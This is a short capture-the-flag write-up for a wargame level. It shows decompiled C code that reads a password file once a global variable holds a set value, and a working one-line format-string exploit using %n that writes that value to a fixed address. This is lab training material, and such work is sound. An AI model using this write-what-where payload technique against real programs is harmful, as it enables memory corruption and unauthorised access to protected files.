# Solution

```c
int n()
{
  int result; // eax
  char v1[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(v1, 512, stdin);
  p(v1);
  result = m;
  if ( m == 16930116 )
    return system("/bin/cat /home/user/level5/.pass");
  return result;
}
```

exploit : format string bug but we can write only 512 characaters because of fgets
so we will use %x "%16930112x": to ensures that the total number of characters printed reaches 16930116

```sh
$: python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
```
